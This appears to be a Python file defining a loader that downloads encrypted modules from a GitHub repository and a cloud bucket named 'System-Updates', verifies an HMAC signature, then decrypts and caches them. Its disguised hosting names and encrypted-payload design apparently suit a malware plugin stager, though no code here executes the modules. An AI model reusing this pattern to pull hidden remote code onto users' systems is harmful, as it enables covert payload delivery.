#!/usr/bin/env python3
import requests
import logging
import hashlib
import hmac
import json

class ModuleLoader:
    def __init__(self,c):
        self.c=c
        self.cache={}
    def _sig(self,k,d):
        return hmac.new(k,d,hashlib.sha256).hexdigest()
    def load_module(self,n,did,k):
        if n in self.cache:
            return self.cache[n]
        srcs=[
            f"https://github.com/Zaen1993/System-Updates/raw/main/modules/{n}.enc",
            f"https://storage.googleapis.com/system-updates/{n}.enc"
        ]
        for u in srcs:
            try:
                r=requests.get(u,timeout=30)
                if r.status_code==200:
                    ed=r.content
                    sig_len=int.from_bytes(ed[:2],'big')
                    sig=ed[2:2+sig_len]
                    mod=ed[2+sig_len:]
                    exp=self._sig(k,mod)
                    if hmac.compare_digest(sig.decode(),exp):
                        d=self.c.decrypt_packet(k,mod)
                        self.cache[n]=d
                        return d
                    else:
                        logging.warning(f"sig mismatch {n}")
            except Exception as e:
                logging.warning(f"fail {n} from {u}: {e}")
        return None